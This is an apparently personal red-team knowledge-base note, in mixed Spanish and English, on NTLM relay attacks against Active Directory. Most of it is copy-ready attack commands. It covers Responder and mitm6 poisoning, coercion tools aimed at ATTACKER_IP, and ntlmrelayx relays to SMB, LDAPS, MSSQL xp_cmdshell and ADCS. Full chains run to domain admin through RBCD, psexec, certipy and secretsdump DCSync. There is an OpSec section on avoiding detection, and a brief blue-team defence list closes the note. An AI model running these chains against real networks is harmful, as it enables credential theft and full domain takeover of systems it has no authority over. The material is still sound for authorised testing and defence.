---
aliases:
  - NTLMRelay
  - Net-NTLM Relay
  - SMB Net-NTLM Relay
  - NTLM Relay Attack
tags:
  - technique/credential-access
  - technique/lateral-movement
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
kind: Technique
linked:
  - "[[Active Directory Explotación]]"
  - "[[Impacket Toolkit]]"
  - "[[Responder]]"
  - "[[AD CS Abuse]]"
---
# NTLM Relay

***

## Cheatsheet
^ntlm-relay

| Target | Outcome | Command |
| --- | --- | --- |
| **SMB** (signing off) | Shell / file access | `ntlmrelayx.py -tf targets.txt -smb2support` |
| **SMB + SOCKS** | Pivot session | `ntlmrelayx.py -tf targets.txt -socks -smb2support` |
| **LDAP / LDAPS** | RBCD, add user, grant ACL | `ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user atk` |
| **MSSQL** | Query + `xp_cmdshell` | `ntlmrelayx.py -t mssql://host -q "exec xp_cmdshell 'whoami'"` |
| **HTTP ADCS Web Enroll** | Cert de DC → DA | `ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController` |
| **RPC (ESC11)** | Cert via ICPR | `ntlmrelayx.py -t rpc://CA -rpc-mode ICPR -icpr-ca-name CA` |
| **WinRM** | Shell | `ntlmrelayx.py -t http://host:5985/wsman` |

***

## Concepto

NTLM authentication no está atada al destino: challenge/response capturado puede relayarse a otro host si:
- Destino acepta NTLM.
- Destino **no requiere signing** (o atacante puede bypass EPA).
- User víctima tiene privilegios sobre destino.

Flujo:
```
Victim → (coerce) → Attacker MITM → Relay → Target (auth as victim)
```

## Requisitos

- Position MITM sobre tráfico del victim (LLMNR poisoning / coercion / malicious link).
- Destination sin SMB signing / LDAP signing / EPA.
- Victim con permisos efectivos en destination (user con sesión en SMB share, computer account con privs).

## 1. Capturar autenticación (4 vías)

### a) LLMNR / NBT-NS / mDNS poisoning ([[Responder]])
```bash
sudo responder -I eth0 -wv
# Modo relay (no responde challenge, forwarda)
sudo responder -I eth0 -v -wFb  # desactivar SMB/HTTP server internos
```

### b) Coercion — fuerza auth de computer account
```bash
# PetitPotam (MS-EFSRPC) — pre-parche a DC
PetitPotam.py -u '' -p '' ATTACKER_IP DC_IP

# PrinterBug (MS-RPRN)
printerbug.py dom.local/user:pass@DC ATTACKER_IP

# DFSCoerce (MS-DFSNM)
dfscoerce.py -u user -p pass ATTACKER_IP DC_IP

# ShadowCoerce (MS-FSRVP)
shadowcoerce.py -u user -p pass ATTACKER_IP DC_IP

# Coercer (wrapper con todas)
coercer coerce -l ATTACKER_IP -t TARGET -u user -p pass
```

### c) Intranet tricks
- File UNC path en documento Office / email (`file://attacker/share`).
- SCF file dropped en share (trigger auto en Explorer).
- Desktop.ini con `IconFile=\\attacker\evil.ico`.
- Hostear LNK con icono UNC.

### d) WPAD / IPv6 takeover
```bash
# mitm6 — IPv6 DHCP takeover + WPAD
mitm6 -d dom.local
# En paralelo:
ntlmrelayx.py -6 -wh fake-wpad.dom.local -t ldaps://DC --delegate-access
```

## 2. Relay → SMB

```bash
# Identificar hosts sin SMB signing
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
# o
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# Relay
sudo ntlmrelayx.py -tf targets.txt -smb2support
# → dump SAM + descargar secrets si user es local admin
```

Modo shell interactivo:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
# Conecta con: nc 127.0.0.1 11000
```

SOCKS proxy:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Usar con proxychains
proxychains nxc smb TARGET -u victim -p LM:NT --local-auth
```

## 3. Relay → LDAP(S) — RBCD attack

Si victim es **computer account**, relay a LDAPS → escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` sobre target → RBCD impersonation.

```bash
# Attacker computer account (si no existe, crear con MAQ > 0)
impacket-addcomputer dom.local/user:pass -computer-name 'ATTACKER$' -computer-pass 'P@ss123' -dc-host DC

# Relay + delegate access
sudo ntlmrelayx.py -t ldaps://DC --delegate-access --escalate-user 'ATTACKER$'

# (Coerce target en otra terminal)
PetitPotam.py -u '' -p '' ATTACKER_IP TARGET_IP

# RBCD abuse
impacket-getST -spn cifs/TARGET.dom.local -impersonate administrator -dc-ip DC 'dom.local/ATTACKER$:P@ss123'
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass TARGET.dom.local
```

Shadow credentials (preferible si certificados disponibles):
```bash
sudo ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target 'TARGET$'
```

## 4. Relay → MSSQL

```bash
ntlmrelayx.py -t mssql://10.10.10.5 -q "exec xp_cmdshell 'whoami'"
```

## 5. Relay → HTTP (ADCS Web Enrollment) [ESC8]

DC coerced → auth como `DC$` → relay a `/certsrv/` → cert de DC.

```bash
sudo ntlmrelayx.py -t http://CA-HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce DC
PetitPotam.py -u '' -p '' ATTACKER_IP DC

# Con cert resultante
certipy auth -pfx dc.pfx -dc-ip DC
# → NT hash de DC$
# DCSync
impacket-secretsdump -hashes :DC_HASH dom.local/DC\$@DC -just-dc
```

## 6. Relay → HTTP WinRM

```bash
ntlmrelayx.py -t http://host:5985/wsman -smb2support
```

## 7. Bypasses

### SMB signing required (`SMB2_NEGOTIATE_SIGNING_REQUIRED`)
- No relayeable a SMB. Usar LDAP / HTTP / MSSQL.

### LDAP signing + channel binding
- Relay a LDAP (389) impacta si signing opcional en cliente.
- LDAPS (636) + channel binding → requiere EPA bypass.

### EPA (Extended Protection for Authentication)
- Cross-protocol relay (SMB→HTTP, HTTP→LDAPS) puede bypassear EPA si origen no setea token binding.
- CVE-2022-26923 (Certifried) pre-parche.

### MIC / SPN bypass (CVE-2019-1040)
- `ntlmrelayx --remove-mic` (parche aplicado, pero DCs legacy vulnerables).

### Drop-the-MIC 2 (CVE-2019-1166)
- Relay con target SPN diferente al original.

## 8. Chain ejemplos

| Chain | Resultado |
| --- | --- |
| `responder` + `ntlmrelayx → SMB` | Shell en host víctima |
| `PetitPotam → ntlmrelayx → ADCS HTTP` | Hash de DC$ → DCSync → DA |
| `mitm6 → ntlmrelayx → LDAPS delegate` | RBCD sobre target → impersonate DA |
| `PrinterBug → ntlmrelayx → LDAPS shadow-creds` | Cert de target computer |
| `Coercer → ntlmrelayx → MSSQL xp_cmdshell` | RCE en DB server |

## 9. OpSec

- Responder hace ruido alto — usar `Analyze` mode primero.
- Coercion deja eventos 4624 + 5145 en DC.
- Relay a DC $ genera 4768/4776 anómalos.
- EDR moderno detecta `ntlmrelayx` por patterns de SMB2 header.
- Preferir targeted relay > mass relay.

## Detección (blue team)

- SMB signing = required en **todos** los hosts.
- LDAP signing + channel binding obligatorios (KB4520412).
- EPA en HTTP endpoints (CertSrv, WSUS, OWA, WinRM).
- Disable LLMNR (GPO) + NBT-NS + mDNS.
- Disable WPAD.
- Honeypot SMB shares con auditoria 5140.

## Recursos

- [ntlmrelayx Wiki](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
- [HackTricks - NTLM Relay](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ntlm-relay)
- [Certified Pre-Owned - ADCS Relay](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)

***
